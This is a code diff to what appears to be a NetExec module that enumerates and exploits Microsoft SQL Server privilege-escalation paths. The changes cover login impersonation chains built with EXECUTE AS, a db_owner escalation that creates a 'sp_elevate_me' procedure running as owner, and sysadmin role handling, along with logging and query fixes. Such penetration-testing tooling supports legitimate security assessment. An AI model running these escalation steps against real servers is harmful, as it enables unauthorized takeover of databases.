@@ -63,7 +63,7 @@ class NXCModule:
             if self.remove_sysadmin_priv():
                 self.context.log.success("sysadmin role removed")
             else:
-                self.context.log.success("failed to remove sysadmin role")
+                self.context.log.fail("failed to remove sysadmin role")
             return
 
         if self.current_user.is_sysadmin:
@@ -138,7 +138,8 @@ class NXCModule:
                 return grantor
             else:
                 self.context.log.display(f"{user.username} can impersonate: {grantor.username}")
-            return self.browse_path(context, initial_user, grantor)
+            if target_user := self.browse_path(context, initial_user, grantor):
+                return target_user
 
     def query_and_get_output(self, query):
         return self.mssql_conn.sql_query(query)
@@ -165,7 +166,7 @@ class NXCModule:
         Args:
         ----
             user (User): The user for whom the impersonation check is being performed.
-            grantors (list): A list of grantors. Default is an empty list.
+            grantors (list): The logins already checked. Default is the given user.
 
         Returns:
         -------
@@ -182,19 +183,16 @@ class NXCModule:
             perform_impersonation_check(user, grantors=['admin', 'manager'])
 
         """
-        # build EXECUTE AS if any grantors is specified
         if grantors is None:
-            grantors = []
-        exec_as = self.sql_exec_as(grantors)
+            grantors = [user.username]
+        # build EXECUTE AS from the impersonation path leading to this user
+        exec_as = self.build_exec_as_from_path(user)
         # do we have any privilege ?
         if self.update_priv(user, exec_as):
             return
         # do we have any grantors ?
         new_grantors = self.get_impersonate_users(exec_as)
         for new_grantor in new_grantors:
-            # skip the case when we can impersonate ourself
-            if new_grantor == user.username:
-                continue
             # create a new user and add it as a grantor of the current user
             if new_grantor not in grantors:
                 new_user = User(new_grantor)
@@ -258,7 +256,7 @@ class NXCModule:
             else:
                 return False
         except ValueError:
-            self.logger.fail(f"Error checking if user is admin, got {is_admin} as response. Expected 0 or 1.")
+            self.context.log.fail(f"Error checking if user is admin, got {is_admin} as response. Expected 0 or 1.")
             return False
 
     def get_databases(self, exec_as="") -> list:
@@ -300,6 +298,7 @@ class NXCModule:
             WHERE rp.name = 'db_owner' AND mp.name = SYSTEM_USER
         """
         res = self.query_and_get_output(exec_as + query)
+        self.revert_context(exec_as)
         return bool(res and "database_role" in res[0] and res[0]["database_role"] == "db_owner")
 
     def find_dbowner_priv(self, databases, exec_as="") -> list:
@@ -337,7 +336,7 @@ class NXCModule:
             """
         result = self.query_and_get_output(exec_as + query)
         self.revert_context(exec_as)
-        return result
+        return [db["DATABASENAME"] for db in result]
 
     def check_dbowner_privesc(self, exec_as=""):
         """
@@ -370,9 +369,9 @@ class NXCModule:
             None
         """
         self.query_and_get_output(exec_as)
-        self.query_and_get_output(f"use {database};")
+        self.query_and_get_output(f"use [{database}];")
 
-        query = """CREATE PROCEDURE sp_elevate_me
+        query = f"""CREATE PROCEDURE sp_elevate_me
             WITH EXECUTE AS OWNER
             as
             begin
@@ -405,7 +404,7 @@ class NXCModule:
 
     def get_impersonate_users(self, exec_as="") -> list:
         """
-        Retrieves a list of users who have the permission to impersonate other users.
+        Retrieves the logins that the current context can impersonate.
 
         Args:
         ----
@@ -413,13 +412,13 @@ class NXCModule:
 
         Returns:
         -------
-            list: A list of user names who have the permission to impersonate other users.
+            list: The names of the logins that can be impersonated.
         """
-        query = """SELECT DISTINCT b.name
-                   FROM  sys.server_permissions a
-                   INNER JOIN sys.server_principals b
-                   ON a.grantor_principal_id = b.principal_id
-                   WHERE a.permission_name like 'IMPERSONATE%'"""
+        # name <> SUSER_NAME(): skip the current login (we can always impersonate ourselves)
+        # QUOTENAME: HAS_PERMS_BY_NAME splits unquoted names on dots (NORTH\jon.snow)
+        query = """SELECT name FROM sys.server_principals
+                   WHERE type_desc IN ('SQL_LOGIN', 'WINDOWS_LOGIN') AND name <> SUSER_NAME()
+                   AND HAS_PERMS_BY_NAME(QUOTENAME(name), 'LOGIN', 'IMPERSONATE') = 1"""
         res = self.query_and_get_output(exec_as + query)
         self.revert_context(exec_as)
         return [user["name"] for user in res]
